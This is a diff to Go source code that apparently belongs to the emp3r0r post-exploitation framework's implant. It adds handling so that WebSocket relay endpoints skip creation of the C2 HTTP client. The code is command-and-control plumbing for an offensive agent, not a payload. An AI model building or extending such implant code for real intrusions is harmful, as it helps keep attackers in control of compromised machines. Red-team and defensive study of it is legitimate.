@@ -231,13 +231,18 @@ connect:
 	}
 
 	// Build C2 HTTP client. Silent Nodes already created theirs above with relay dialer.
-	if !isSilentNode {
+	// Rendezvous relay endpoints (ws://wss://) don't use an HTTP client at all —
+	// the worker_ws channel dials its own WebSocket; nil client is expected there.
+	isRelayEndpoint := strings.HasPrefix(def.CCAddress, "ws://") || strings.HasPrefix(def.CCAddress, "wss://")
+	if !isSilentNode && !isRelayEndpoint {
 		def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 		if def.HTTPClient == nil {
 			logging.Infof("[-] Failed to create HTTP2 client, signaling parent and retrying")
 			conditionalC2FailNotify()
 			goto connect
 		}
+	} else if isRelayEndpoint {
+		logging.Infof("[+] Relay endpoint mode: skipping HTTP client, worker_ws channel will dial directly")
 	} else if def.HTTPClient == nil {
 		// Gateway died: the gateway-dead goroutine cleared def.HTTPClient and is calling
 		// WaitForRoute(). Rather than polling with sleep, we call WaitForRoute() here too —
